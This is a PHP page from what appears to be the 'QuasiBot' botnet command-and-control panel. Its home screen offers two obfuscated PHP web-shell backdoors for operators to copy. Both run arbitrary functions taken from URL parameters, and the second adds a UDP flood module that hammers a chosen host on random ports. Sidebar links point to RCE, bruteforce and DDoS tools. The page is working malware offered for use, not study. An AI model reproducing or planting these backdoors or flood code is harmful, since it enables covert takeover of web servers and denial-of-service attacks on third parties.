<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | home</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="index.php">&nbsp; &nbsp; &nbsp;<?php echo "QuasiBot" ?></a></h1>

<?php
quotes();
?>

        </div>
    </div>
    <div id="menu">
        <ul>
         	<li class="txt_left"><?php echo "Local Address: " . $_SERVER['SERVER_ADDR'] ?></li>
            	<li class="txt_center"></li>
            	<li class="txt_right"><?php echo "Remote Address: " . conn('http://bot.whatismyipaddress.com/') ?></li>
        </ul>
    </div>
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                        <?php
                        checkbots();
						?>
                            </p>
                        </div>
                    </div> 
                    <div class="post">
                        <h2 class="title"><a href="#">Backdoor</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                            Current PHP backdoor source code
                            </p>
				<textarea style="border: none" rows="10" cols="80">
date_default_timezone_set('Europe/London');
if($_GET['_']) {
print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { @$_GET['___'](); }
				</textarea>


                        </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">Backdoor w/ ddos</a></h2>
                        <div class="entry">
                            <p class="meta"> 
                            Current PHP backdoor with source code, ddos module included (not necessary)
                            </p>
				<textarea style="border: none" rows="15" cols="80">
					<?php echo WEBSHELL_PASS; ?>
date_default_timezone_set('Europe/London');
if($_GET['_']) {
print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
print "{:|".md5("<?php echo WEBSHELL_PASS; ?>".date("h:d"))."{:|".PHP_OS."{:|-->";
} elseif($_GET['___']) { @$_GET['___'](); } elseif(isset($_POST['target'])&&isset($_POST['time'])){$fn0=0;$pm1=$_POST['time'];$yu2=time();$az3=$yu2+$pm1;$jd4=$_POST['target'];$kb5=gethostbyname($jd4);for($pt6=0;$pt6<65553;$pt6++){$yf7.='X';}while(1){$fn0++;if(time()>$az3){break;}$yw8=rand(1,65553);$vl9=fsockopen('udp://'.$kb5,$yw8,$ic10,$yf11,5);if($vl9){fwrite($vl9,$yf7);fclose($vl9);}}}elseif($_POST['kill']=='1'){exit(0);}
				</textarea>


                        </div>
                    </div>
                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="index.php"><b>Index</b></a></li>
                                <li><a href="settings.php">Settings</a></li>
                                <li><a href="rss.php">RSS</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="../hack/rce.php">RCE</a></li>
                                <li><a href="../hack/scan.php">Scan</a></li>
                                <li><a href="../hack/pwn.php">Pwn</a></li>
                                <li><a href="../hack/shell.php">Shell</a></li>
                            </ul>
                        </li>
                        <li>
                        <li>
                           <h2>Bruteforce</h2>
                            <ul>
                                <li><a href="../bf/ssh.php">SSH</a></li>
                                <li><a href="../bf/ftp.php">FTP</a></li>
                                <li><a href="../bf/dbs.php">DB's</a></li>
                                <li><a href="../bf/www.php">WWW</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="../tools/sql.php">MySQL Manager</a></li>
                                <li><a href="../tools/hostscan.php">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="../hack/ddos.php">DDoS</a></li>
                                <li><a href="../hack/more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
